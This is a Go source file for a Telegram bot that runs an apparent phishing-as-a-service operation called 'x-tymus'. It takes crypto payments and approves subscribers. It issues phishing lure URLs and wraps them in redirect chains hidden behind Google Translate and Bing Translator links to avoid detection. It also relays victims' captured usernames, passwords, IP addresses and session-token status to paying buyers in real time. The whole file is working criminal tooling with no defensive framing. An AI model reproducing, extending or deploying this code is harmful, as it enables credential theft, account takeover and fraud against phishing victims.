package core

import (
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// GlobalBot is set once at startup so other packages can call NotifySession.
var GlobalBot *TelegramBot

type TelegramBot struct {
	api  *tgbotapi.BotAPI
	cfg  *Config
	db   *database.Database
}

// NewTelegramBot creates the bot. Returns nil if no token is configured.
func NewTelegramBot(cfg *Config, db *database.Database) (*TelegramBot, error) {
	token := cfg.GetBotToken()
	if token == "" {
		return nil, nil
	}
	api, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, fmt.Errorf("telegram bot: %v", err)
	}
	b := &TelegramBot{api: api, cfg: cfg, db: db}
	log.Info("telegram bot started: @%s", api.Self.UserName)
	return b, nil
}

// Start begins polling for updates and the expiry cleanup ticker.
func (b *TelegramBot) Start() {
	go b.expiryLoop()

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 30
	updates, err := b.api.GetUpdatesChan(u)
	if err != nil {
		log.Error("telegram bot: get updates: %v", err)
		return
	}
	for update := range updates {
		if update.Message == nil {
			continue
		}
		go b.handleMessage(update.Message)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Message router
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) handleMessage(msg *tgbotapi.Message) {
	chatId := msg.Chat.ID
	isAdmin := chatId == b.cfg.GetBotAdminChatId()
	text := strings.TrimSpace(msg.Text)
	parts := strings.Fields(text)
	if len(parts) == 0 {
		return
	}
	cmd := strings.ToLower(parts[0])

	if isAdmin {
		b.handleAdmin(msg, cmd, parts)
	} else {
		b.handleUser(msg, cmd, parts)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Admin commands
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) handleAdmin(msg *tgbotapi.Message, cmd string, parts []string) {
	chatId := msg.Chat.ID
	switch cmd {
	case "/start", "/help":
		b.send(chatId, `*x-tymus Admin Bot*

*Subscriptions*
/pending — list pending payments
/approve <id> — approve payment & activate subscription
/reject <id> — reject & delete subscription
/subs — list all active subscriptions
/delsub <id> — delete a subscription

*Users & Sessions*
/stats — overview stats
/sessions — last 10 sessions
/users — list users

*Config*
/setprice <usd> — set subscription price
/setbtc <address> — set BTC wallet
/seteth <address> — set ETH wallet
/setusdt <address> — set USDT (TRC20) wallet
/setphishlet <name> — set default phishlet for new subs`)

	case "/stats":
		subs, _ := b.db.ListSubscriptions()
		sessions, _ := b.db.ListSessions()
		active := 0
		pending := 0
		for _, s := range subs {
			switch s.Status {
			case "active":
				active++
			case "pending":
				pending++
			}
		}
		tokens := 0
		for _, s := range sessions {
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				tokens++
			}
		}
		b.send(chatId, fmt.Sprintf(
			"📊 *Stats*\n\n"+
				"💳 Active subs: `%d`\n"+
				"⏳ Pending payment: `%d`\n"+
				"🎯 Sessions: `%d`\n"+
				"🍪 With tokens: `%d`",
			active, pending, len(sessions), tokens))

	case "/pending":
		subs, _ := b.db.ListSubscriptions()
		var lines []string
		for _, s := range subs {
			if s.Status == "pending" {
				lines = append(lines, fmt.Sprintf(
					"ID `%d` — chat `%d` — phishlet `%s`\nTX: `%s`\n/approve %d | /reject %d",
					s.Id, s.TelegramChatId, s.Phishlet, s.TxHash, s.Id, s.Id))
			}
		}
		if len(lines) == 0 {
			b.send(chatId, "No pending payments.")
			return
		}
		b.send(chatId, "⏳ *Pending Payments*\n\n"+strings.Join(lines, "\n\n"))

	case "/approve":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /approve <id>")
			return
		}
		id, err := strconv.Atoi(parts[1])
		if err != nil {
			b.send(chatId, "Invalid ID.")
			return
		}
		sub, err := b.db.GetSubscription(id)
		if err != nil {
			b.send(chatId, fmt.Sprintf("Subscription %d not found.", id))
			return
		}
		if sub.Status != "pending" {
			b.send(chatId, fmt.Sprintf("Subscription %d is not pending (status: %s).", id, sub.Status))
			return
		}

		// Create x-tymus user + lure for this subscriber
		username := fmt.Sprintf("sub_%d", sub.TelegramChatId)
		token := GenRandomToken()
		password := GenRandomString(12)

		_, err = b.db.CreateUser(username, password, token)
		if err != nil && !strings.Contains(err.Error(), "already exists") {
			b.send(chatId, fmt.Sprintf("Failed to create user: %v", err))
			return
		}

		phishlet := sub.Phishlet
		if phishlet == "" {
			phishlet = b.cfg.GetDefaultPhishlet()
		}
		if phishlet == "" {
			b.send(chatId, "No phishlet set. Use /setphishlet <name> first.")
			return
		}

		pl, err := b.cfg.GetPhishlet(phishlet)
		if err != nil {
			b.send(chatId, fmt.Sprintf("Phishlet '%s' not found.", phishlet))
			return
		}
		bhost, ok := b.cfg.GetSiteDomain(pl.Name)
		if !ok || bhost == "" {
			b.send(chatId, fmt.Sprintf("No hostname set for phishlet '%s'.", phishlet))
			return
		}

		lure := &Lure{
			Path:        "/" + GenRandomString(8),
			Phishlet:    phishlet,
			RedirectUrl: b.cfg.GetDefaultRedirectUrl(),
			UserId:      username,
		}
		b.cfg.AddLure(phishlet, lure)
		lureIdx := len(b.cfg.lures) - 1

		lureURL, _ := pl.GetLureUrl(lure.Path)
		parsedFinal, _ := url.Parse(lureURL)
		phishBase := parsedFinal.Scheme + "://" + parsedFinal.Host
		outer, _, err := GenerateRedirectChain(phishBase, lureURL, 3, b.cfg.GetRedirectChainSecret())

		chainTranslate := ""
		chainBing := ""
		chainDirect := outer
		if err == nil {
			chainTranslate = "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
			chainBing = "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)
		}

		b.db.ActivateSubscription(id, username, lureURL, chainTranslate, chainBing, chainDirect, lureIdx)

		expiry := time.Now().UTC().AddDate(0, 1, 0)

		// Notify admin
		b.send(chatId, fmt.Sprintf(
			"✅ *Approved* subscription `%d`\n\n"+
				"User: `%s`\nPhishlet: `%s`\nExpires: `%s`",
			id, username, phishlet, expiry.Format("2006-01-02")))

		// Notify the buyer
		b.send(sub.TelegramChatId, fmt.Sprintf(
			"🎉 *Your subscription is active!*\n\n"+
				"📅 Expires: `%s`\n\n"+
				"🔗 *Your lure URL:*\n`%s`\n\n"+
				"🌐 *Google Translate link (recommended):*\n`%s`\n\n"+
				"🌐 *Bing Translator link:*\n`%s`\n\n"+
				"📦 *Direct chain:*\n`%s`\n\n"+
				"💬 Use /setnotify <chat_id> to receive session logs.\n"+
				"📊 Use /logs to view captured sessions.\n"+
				"🔑 Use /mylink to see your links again.",
			expiry.Format("2006-01-02"),
			lureURL, chainTranslate, chainBing, chainDirect))

	case "/reject":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /reject <id>")
			return
		}
		id, _ := strconv.Atoi(parts[1])
		sub, err := b.db.GetSubscription(id)
		if err != nil {
			b.send(chatId, "Not found.")
			return
		}
		b.db.DeleteSubscription(id)
		b.send(sub.TelegramChatId, "❌ Your payment was rejected. Contact support if you believe this is an error.")
		b.send(chatId, fmt.Sprintf("Rejected and deleted subscription %d.", id))

	case "/subs":
		subs, _ := b.db.ListSubscriptions()
		var lines []string
		for _, s := range subs {
			if s.Status != "active" {
				continue
			}
			exp := time.Unix(s.ExpiresAt, 0).Format("2006-01-02")
			lines = append(lines, fmt.Sprintf(
				"ID `%d` | chat `%d` | `%s` | expires `%s`",
				s.Id, s.TelegramChatId, s.Phishlet, exp))
		}
		if len(lines) == 0 {
			b.send(chatId, "No active subscriptions.")
			return
		}
		b.send(chatId, "✅ *Active Subscriptions*\n\n"+strings.Join(lines, "\n"))

	case "/delsub":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /delsub <id>")
			return
		}
		id, _ := strconv.Atoi(parts[1])
		sub, err := b.db.GetSubscription(id)
		if err != nil {
			b.send(chatId, "Not found.")
			return
		}
		b.db.DeleteSubscription(id)
		b.send(sub.TelegramChatId, "⚠️ Your subscription has been cancelled by the admin.")
		b.send(chatId, fmt.Sprintf("Deleted subscription %d.", id))

	case "/sessions":
		sessions, _ := b.db.ListSessions()
		if len(sessions) == 0 {
			b.send(chatId, "No sessions yet.")
			return
		}
		last := sessions
		if len(last) > 10 {
			last = last[len(last)-10:]
		}
		var lines []string
		for _, s := range last {
			status := "⚪"
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 {
				status = "🟢"
			}
			lines = append(lines, fmt.Sprintf(
				"%s `%s` / `%s` — `%s` — `%s`",
				status, s.Username, s.Password, s.Phishlet, s.RemoteAddr))
		}
		b.send(chatId, "🎯 *Recent Sessions*\n\n"+strings.Join(lines, "\n"))

	case "/users":
		users, _ := b.db.ListUsers()
		if len(users) == 0 {
			b.send(chatId, "No users.")
			return
		}
		var lines []string
		for _, u := range users {
			lines = append(lines, fmt.Sprintf("• `%s` — created `%s`", u.Username, time.Unix(u.CreatedAt, 0).Format("2006-01-02")))
		}
		b.send(chatId, "*Users*\n\n"+strings.Join(lines, "\n"))

	case "/setprice":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setprice <usd>")
			return
		}
		p, err := strconv.Atoi(parts[1])
		if err != nil || p <= 0 {
			b.send(chatId, "Invalid price.")
			return
		}
		b.cfg.general.SubPrice = p
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, fmt.Sprintf("Price set to $%d/month.", p))

	case "/setbtc":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setbtc <address>")
			return
		}
		b.cfg.general.CryptoBTC = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, "BTC wallet updated.")

	case "/seteth":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /seteth <address>")
			return
		}
		b.cfg.general.CryptoETH = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, "ETH wallet updated.")

	case "/setusdt":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setusdt <address>")
			return
		}
		b.cfg.general.CryptoUSDT = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, "USDT (TRC20) wallet updated.")

	case "/setphishlet":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setphishlet <name>")
			return
		}
		b.cfg.general.DefaultPhishlet = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, fmt.Sprintf("Default phishlet set to: %s", parts[1]))

	default:
		b.send(chatId, "Unknown command. Send /help for the command list.")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Buyer / user commands
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []string) {
	chatId := msg.Chat.ID
	price := b.cfg.GetSubPrice()

	switch cmd {
	case "/start":
		b.send(chatId, fmt.Sprintf(
			"👋 *Welcome to x-tymus*\n\n"+
				"Get your private phishing link — fully managed, top-tier redirect, live session logs delivered straight to Telegram.\n\n"+
				"💰 *Price:* $%d / month\n"+
				"💳 *Payment:* Crypto (BTC, ETH, USDT)\n\n"+
				"📌 Commands:\n"+
				"/buy — see payment instructions\n"+
				"/pay <tx_hash> — submit your payment\n"+
				"/status — check your subscription\n"+
				"/mylink — view your links\n"+
				"/logs — recent captured sessions\n"+
				"/setnotify <chat_id> — set where logs are sent\n"+
				"/help — full command list",
			price))

	case "/help":
		b.send(chatId, fmt.Sprintf(
			"*x-tymus Commands*\n\n"+
				"/buy — payment instructions ($%d/month)\n"+
				"/pay <tx_hash> — submit payment proof\n"+
				"/status — subscription status & expiry\n"+
				"/mylink — your lure URL and redirect chain links\n"+
				"/logs — last 10 captured sessions for your link\n"+
				"/setnotify <chat_id> — set Telegram chat ID for live logs\n"+
				"  → your own chat ID, a group, or another bot",
			price))

	case "/buy":
		btc := b.cfg.GetCryptoBTC()
		eth := b.cfg.GetCryptoETH()
		usdt := b.cfg.GetCryptoUSDT()

		wallets := ""
		if btc != "" {
			wallets += fmt.Sprintf("\n🟠 *BTC:*\n`%s`", btc)
		}
		if eth != "" {
			wallets += fmt.Sprintf("\n🔷 *ETH:*\n`%s`", eth)
		}
		if usdt != "" {
			wallets += fmt.Sprintf("\n🟢 *USDT (TRC20):*\n`%s`", usdt)
		}
		if wallets == "" {
			b.send(chatId, "Wallets not configured yet. Contact the admin.")
			return
		}

		b.send(chatId, fmt.Sprintf(
			"💳 *Payment Instructions*\n\n"+
				"Amount: *$%d*\n\n"+
				"Send to any of these addresses:%s\n\n"+
				"After sending, submit your TX hash:\n`/pay <transaction_hash>`\n\n"+
				"Your subscription will be activated within minutes after admin verification.",
			price, wallets))

	case "/pay":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /pay <transaction_hash>")
			return
		}
		txHash := parts[1]

		// Check if already subscribed
		existing, err := b.db.GetSubscriptionByChatId(chatId)
		if err == nil {
			switch existing.Status {
			case "pending":
				b.send(chatId, "⏳ Your previous payment is already pending review. Please wait.")
				return
			case "active":
				b.send(chatId, fmt.Sprintf("✅ You already have an active subscription until `%s`.",
					time.Unix(existing.ExpiresAt, 0).Format("2006-01-02")))
				return
			}
		}

		phishlet := b.cfg.GetDefaultPhishlet()
		sub, err := b.db.CreateSubscription(chatId, txHash, phishlet)
		if err != nil {
			b.send(chatId, "Failed to register payment. Try again.")
			return
		}

		b.send(chatId, fmt.Sprintf(
			"⏳ *Payment submitted!*\n\n"+
				"TX Hash: `%s`\n"+
				"ID: `%d`\n\n"+
				"The admin will verify and activate your subscription shortly.\n"+
				"You'll receive a message here when it's ready.",
			txHash, sub.Id))

		// Alert admin
		adminId := b.cfg.GetBotAdminChatId()
		if adminId != 0 {
			b.send(adminId, fmt.Sprintf(
				"💰 *New Payment — ID %d*\n\n"+
					"From chat: `%d`\n"+
					"Phishlet: `%s`\n"+
					"TX: `%s`\n\n"+
					"/approve %d | /reject %d",
				sub.Id, chatId, phishlet, txHash, sub.Id, sub.Id))
		}

	case "/status":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil {
			b.send(chatId, "No subscription found. Use /buy to get started.")
			return
		}
		emoji := map[string]string{"pending": "⏳", "active": "✅", "expired": "❌"}[sub.Status]
		exp := ""
		if sub.ExpiresAt > 0 {
			exp = fmt.Sprintf("\n📅 Expires: `%s`", time.Unix(sub.ExpiresAt, 0).Format("2006-01-02 15:04 UTC"))
		}
		b.send(chatId, fmt.Sprintf(
			"%s *Subscription Status: %s*%s\n\nPhishlet: `%s`",
			emoji, strings.ToUpper(sub.Status), exp, sub.Phishlet))

	case "/mylink":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil || sub.Status != "active" {
			b.send(chatId, "No active subscription. Use /buy to get one.")
			return
		}
		b.send(chatId, fmt.Sprintf(
			"🔗 *Your Links*\n\n"+
				"*Lure URL:*\n`%s`\n\n"+
				"🌐 *Google Translate (recommended):*\n`%s`\n\n"+
				"🌐 *Bing Translator:*\n`%s`\n\n"+
				"📦 *Direct chain:*\n`%s`\n\n"+
				"📅 Expires: `%s`",
			sub.LureURL,
			sub.ChainTranslate,
			sub.ChainBing,
			sub.ChainDirect,
			time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")))

	case "/setnotify":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil || sub.Status != "active" {
			b.send(chatId, "No active subscription.")
			return
		}
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setnotify <chat_id>\n\nSend /notify_me to get your chat ID, or add me to a group and I'll send the ID.")
			return
		}
		notifyId, err := strconv.ParseInt(parts[1], 10, 64)
		if err != nil {
			b.send(chatId, "Invalid chat ID.")
			return
		}
		b.db.SetSubscriptionNotify(sub.Id, notifyId)
		b.send(chatId, fmt.Sprintf("✅ Session logs will be sent to chat `%d`.", notifyId))
		// Test message
		b.send(notifyId, "✅ x-tymus log delivery is active for your subscription.")

	case "/notify_me":
		b.send(chatId, fmt.Sprintf("Your chat ID is: `%d`\n\nUse `/setnotify %d` to receive logs here.", chatId, chatId))

	case "/logs":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil || sub.Status != "active" {
			b.send(chatId, "No active subscription.")
			return
		}
		sessions, _ := b.db.ListSessions()
		var userSessions []*database.Session
		for _, s := range sessions {
			if s.Phishlet == sub.Phishlet {
				userSessions = append(userSessions, s)
			}
		}
		if len(userSessions) == 0 {
			b.send(chatId, "No sessions captured yet.")
			return
		}
		last := userSessions
		if len(last) > 10 {
			last = last[len(last)-10:]
		}
		var lines []string
		for _, s := range last {
			status := "⚪ no tokens"
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 {
				status = "🟢 tokens captured"
			}
			uname := s.Username
			if uname == "" {
				uname = "—"
			}
			pass := s.Password
			if pass == "" {
				pass = "—"
			}
			lines = append(lines, fmt.Sprintf(
				"🎯 `%s` / `%s`\n   IP: `%s`  %s\n   Time: `%s`",
				uname, pass, s.RemoteAddr, status,
				time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")))
		}
		b.send(chatId, "📋 *Your Sessions*\n\n"+strings.Join(lines, "\n\n"))

	default:
		b.send(chatId, "Unknown command. Send /help for the list.")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Session notification (called by http_proxy when credentials captured)
// ─────────────────────────────────────────────────────────────────────────────

// NotifySession sends a live session alert to the subscriber's notify chat.
// Called from the http_proxy OnResponse handler when credentials are captured.
func NotifySession(lureId int, phishlet, username, password, remoteAddr string, hasTokens bool) {
	if GlobalBot == nil {
		return
	}
	sub, err := GlobalBot.db.GetSubscriptionByLureId(lureId)
	if err != nil || sub.NotifyChatId == 0 {
		return
	}

	tokenStatus := "⚪ no tokens yet"
	if hasTokens {
		tokenStatus = "🟢 *session tokens captured!*"
	}

	uname := username
	if uname == "" {
		uname = "—"
	}
	pass := password
	if pass == "" {
		pass = "—"
	}

	msg := fmt.Sprintf(
		"🎯 *New Session — %s*\n\n"+
			"👤 Username: `%s`\n"+
			"🔑 Password: `%s`\n"+
			"🌐 IP: `%s`\n"+
			"%s\n\n"+
			"Use /logs to see all sessions.",
		phishlet, uname, pass, remoteAddr, tokenStatus)

	GlobalBot.send(sub.NotifyChatId, msg)
}

// ─────────────────────────────────────────────────────────────────────────────
// Expiry cleanup loop
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) expiryLoop() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		expired, err := b.db.ExpireOldSubscriptions()
		if err != nil || len(expired) == 0 {
			continue
		}
		for _, sub := range expired {
			log.Info("telegram bot: subscription %d expired (chat %d)", sub.Id, sub.TelegramChatId)
			b.send(sub.TelegramChatId,
				"⏰ *Your subscription has expired.*\n\n"+
					"Your link is now deactivated. Use /buy to renew for another month.")
			if b.cfg.GetBotAdminChatId() != 0 {
				b.send(b.cfg.GetBotAdminChatId(), fmt.Sprintf(
					"⏰ Subscription `%d` (chat `%d`) expired and deactivated.", sub.Id, sub.TelegramChatId))
			}
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Helper
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) send(chatId int64, text string) {
	m := tgbotapi.NewMessage(chatId, text)
	m.ParseMode = "Markdown"
	if _, err := b.api.Send(m); err != nil {
		log.Error("telegram bot: send to %d: %v", chatId, err)
	}
}
